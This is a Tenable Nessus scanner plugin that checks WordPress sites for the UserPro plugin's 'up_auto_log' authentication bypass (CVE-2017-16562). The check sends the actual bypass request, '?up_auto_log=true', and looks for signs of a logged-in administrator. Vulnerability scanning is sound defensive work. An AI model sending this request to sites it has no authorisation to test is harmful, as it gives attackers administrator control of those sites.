#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(110482);
  script_version("1.4");
  script_cvs_date("Date: 2019/11/04");

  script_cve_id("CVE-2017-16562");
  script_xref(name:"EDB-ID", value:"43117");

  script_name(english:"UserPro Plugin for WordPress up_auto_log Parameter Remote Authentication Bypass");
  script_summary(english:"Checks for auto-login with up_auto_log parameter");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is running a PHP application that is affected
by a remote authentication bypass vulnerability.");
  script_set_attribute(attribute:"description", value:
"The UserPro Plugin for WordPress running on the remote web server
is prior to version 4.9.17.1 It is, therefore, affected by a remote
authentication bypass vulnerability. A remote, unauthenticated
attacker can exploit this vulnerability, via a specially crafted
request, to login as an administrator.");
  # https://codecanyon.net/item/userpro-user-profiles-with-social-login/5958681?s_rank=9
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?cad387dc");
  # https://packetstormsecurity.com/files/144905/WordPress-UserPro-4.6.17-Authentication-Bypass.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e5c0e4c4");
  script_set_attribute(attribute:"solution", value:
"Upgrade the UserPro Plugin for WordPress to version 4.9.17.1 or
later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2017-16562");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/04/11");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/10/26");
  script_set_attribute(attribute:"plugin_publication_date", value:"2018/06/12");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2018-2019 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");
include("misc_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];

#Check the plugin
plugin = "UserPro";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);
install_url = build_url(port:port, qs:dir);

if (!installed)
{
  path = "/wp-content/plugins/userpro/";

  checks = make_array();
  checks[path + "scripts/up-custom-script.js"][0] = make_list('userpro', 'css/userpro.min.css', 'jQuery');
  checks[path + "css/userpro.min.css"][0] = make_list('userpro-tip', 'userpro_connection');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir : dir,
    port : port,
    ext : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# Exploit vulnerability
vuln_url = install_url + "?up_auto_log=true";

res = http_send_recv3(method:'GET', port:port, item:dir + "?up_auto_log=true",exit_on_fail:TRUE);

# These are the indicators that we logged in as an admin now
ptn_match = preg(multiline:TRUE, pattern:"<link rel='stylesheet'\s+id='admin-bar-css'.*<body class=.home blog\s+logged-in\s+admin-bar", string:res[2]);
if (ptn_match) #
{
  security_report_v4(
    port : port,
    generic : TRUE,
    request : make_list(vuln_url),
    severity : SECURITY_HOLE
  );
}
else
{
    audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, 'UserPro plugin');
}
